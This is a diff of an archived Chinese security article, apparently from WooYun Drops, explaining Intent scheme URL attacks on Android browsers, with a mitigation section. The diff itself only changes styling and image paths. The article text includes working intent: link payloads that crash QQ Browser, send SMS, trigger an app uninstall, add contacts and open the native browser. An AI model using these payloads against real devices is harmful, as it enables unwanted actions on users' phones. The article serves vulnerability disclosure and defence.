@@ -3,14 +3,14 @@
 			<head>
 			     <title>Intent scheme URL attack - 瘦蛟舞</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/2893">http://drops.wooyun.org/papers/2893</a></h1>
 				
       <p>
-        <h2>0x01 Android Intents with Chrome</h2>
+        </p><h2>0x01 Android Intents with Chrome</h2>
 
-<hr />
+<hr>
 
 <p>Android有一个很少人知道的特性可以通过web页面发送intent来启动apps。以前通过网页启动app是通过设置iframe的src属性，例如：</p>
 
@@ -38,9 +38,9 @@
 
 <p>语法细节见源码<a href="https://code.google.com/p/android-source-browsing/source/browse/core/java/android/content/Intent.java?repo=platform--frameworks--base#6514">Android source</a></p>
 
-<p><img src="http://static.wooyun.org/20140828/2014082804323473396.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014082804323473396.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/20140828/2014082804323498800.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014082804323498800.png" alt="enter image description here"></p>
 
 <p><strong>1.2 简单举例</strong></p>
 
@@ -73,7 +73,7 @@
 
 <h2>0x02 利用思路</h2>
 
-<hr />
+<hr>
 
 <p>在Android上的Intent-based攻击很普遍，这种攻击轻则导致应用程序崩溃，重则可能演变提权漏洞。当然，通过静态特征匹配，Intent-Based的恶意样本还是很容易被识别出来的。 然而最近出现了一种基于Android Browser的攻击手段——Intent Scheme URLs攻击。这种攻击方式利用了浏览器保护措施的不足，通过浏览器作为桥梁间接实现Intend-Based攻击。相比于普通Intend-Based攻击，这种方式极具隐蔽性，而且由于恶意代码隐藏WebPage中，传统的特征匹配完全不起作用。除此之外，这种攻击还能直接访问跟浏览器自身的组件（无论是公开还是私有）和私有文件，比如cookie文件，进而导致用户机密信息的泄露。</p>
 
@@ -108,7 +108,7 @@ intent.putExtra("abc", 678);
 
 <h2>0x04 Intent scheme URI的解析及过滤</h2>
 
-<hr />
+<hr>
 
 <p>如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理：</p>
 
@@ -134,7 +134,7 @@ intent.putExtra("abc", 678);
 
 <h2>0x05 乌云案例</h2>
 
-<hr />
+<hr>
 
 <p> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-073875">WooYun: qq浏览器IntentScheme处理不当</a> </p>
 
@@ -147,44 +147,44 @@ intent.putExtra("abc", 678);
 &lt;/a&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140828/2014082804323426472.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014082804323426472.png" alt="enter image description here"></p>
 
 <pre><code>&lt;a href="intent:#Intent;component=com.tencent.mtt/com.tencent.mtt.debug.DbgMemWatch;end"&gt;
     qq浏览器崩溃
 &lt;/a&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140829/2014082904195693450.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014082904195693450.png" alt="enter image description here"></p>
 
 <pre><code>&lt;a href="intent:http://drops.wooyun.org/webview.html#Intent;component=com.android.browser/com.android.browser.BrowserActivity;end"&gt;
     打开原生浏览器
 &lt;/a&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140829/2014082904195948004.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014082904195948004.png" alt="enter image description here"></p>
 
-<hr />
+<hr>
 
 <pre><code>&lt;a href="intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end"&gt;
    发送短信
 &lt;/a&gt;&lt;br&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <pre><code>&lt;a href="intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end"&gt;
    打开相机
 &lt;/a&gt;&lt;br&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <pre><code>&lt;a href="intent:package:org.wooyun.hiwooyun#Intent;action=android.intent.action.DELETE;end"&gt;
    删除应用
 &lt;/a&gt;&lt;br&gt;
 </code></pre>
 
-<hr />
+<hr>
 
 <pre><code>&lt;a href="intent:#Intent;action=android.intent.action.INSERT_OR_EDIT;S.name=magic;S.phone=+8610000;i.phone_type=2;type=vnd.android.cursor.item/person;end"&gt;
     添加联系人
@@ -193,7 +193,7 @@ intent.putExtra("abc", 678);
 
 <h2>0x06 修复</h2>
 
-<hr />
+<hr>
 
 <p>通过以上漏洞的描述，总结得出一种相对比较安全的Intent Filter方法，代码如下：</p>
 
@@ -211,11 +211,11 @@ context.startActivityIfNeeded(intent, -1);
 
 <h2>0x07 参考</h2>
 
-<hr />
+<hr>
 
 <p><a href="http://www.mbsd.jp/Whitepaper/IntentScheme.pdf">http://www.mbsd.jp/Whitepaper/IntentScheme.pdf</a></p>
 
-<p><a href="http://blog.csdn.net/l173864930/article/details/36951805">http://blog.csdn.net/l173864930/article/details/36951805</a></p>      </p>
+<p><a href="http://blog.csdn.net/l173864930/article/details/36951805">http://blog.csdn.net/l173864930/article/details/36951805</a></p>      <p></p>
     
 			</body>
 		</html>
